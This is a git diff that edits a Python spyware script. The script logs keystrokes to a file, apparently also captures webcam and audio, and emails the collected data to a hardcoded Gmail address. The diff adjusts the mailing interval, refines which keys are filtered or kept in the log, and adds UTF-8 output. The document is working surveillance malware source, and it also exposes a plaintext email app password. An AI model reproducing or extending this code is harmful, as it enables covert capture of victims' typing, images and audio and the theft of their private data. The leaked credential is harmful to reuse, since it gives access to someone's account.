@@ -25,7 +25,7 @@ from threading import Thread
 sender_email = "tiennguyenmanh.0306@gmail.com"  #Enter email here
 sender_password = "qpwb ccsa dpuq gkht"         #Enter app password of email here
 receiver_email = sender_email                   #Enter receiver email here
-mail_interval = 300                             #Adjust the time between each email send
+mail_interval = 3000                             #Adjust the time between each email send
 save_interval = 10                              #Adjust the time between each file save
 
 # Name of folder
@@ -212,8 +212,9 @@ if True:
 def on_press(key):
     key = str(key)
     key = key.replace("'", "")
-    func_keys = ["Key.esc", "Key.caps_lock", "Key.tab", "Key.ctrl_l", "Key.shift_r", "Key.alt_gr", "Key.alt_l", "Key.cmd ", "Key.ctrl_l", "�", "Key.delete"]
+    func_keys = ["Key.esc", "Key.caps_lock", "Key.tab", "Key.ctrl_r", "Key.shift_r", "Key.alt_gr", "Key.alt_l", "Key.cmd ", "Key.ctrl_l", "�", "Key.delete", "Key.shift", "\\x03", "\\x16", "\\x1a", "\\x01","\\x13", "Key.num_lock", "\\x18"]
     numb_keys = ["<96>", "<97>", "<98>", "<99>", "<100>", "<101>", "<102>", "<103>", "<104>", "<105>"]
+    retained_keys = ["Key.down", "Key.up", "Key.right", "Key.left", "Key.backspace"]
     try:
         if key in func_keys:
             key = ""
@@ -223,17 +224,12 @@ def on_press(key):
             key = "\n"
         elif key == "Key.space":
             key = " "
-        elif key == "Key.backspace":
-            key = "[backspace]"
-        elif key == "Key.down":
-            key = "[down]"
-        elif key == "Key.up":
-            key = "[up]"
-        elif key == "Key.right":
-            key = "[right]"
-        elif key == "Key.left":
-            key = "[left]"
-        with open(os.path.join(keylog_folder, "keylog.txt"), "a") as log_file:
+        elif key == "<110>":
+            key = "."
+        elif key in retained_keys: 
+            key = key.replace("Key.", "")
+            key = "[" + key + "]"
+        with open(os.path.join(keylog_folder, "keylog.txt"), "a", encoding='utf-8') as log_file:
             log_file.write(key)
     except:
         pass
@@ -263,4 +259,3 @@ while True:
     delete_all_files(webcam_folder)
     delete_all_files(audio_folder)
     delete_all_files(keylog_folder)
-
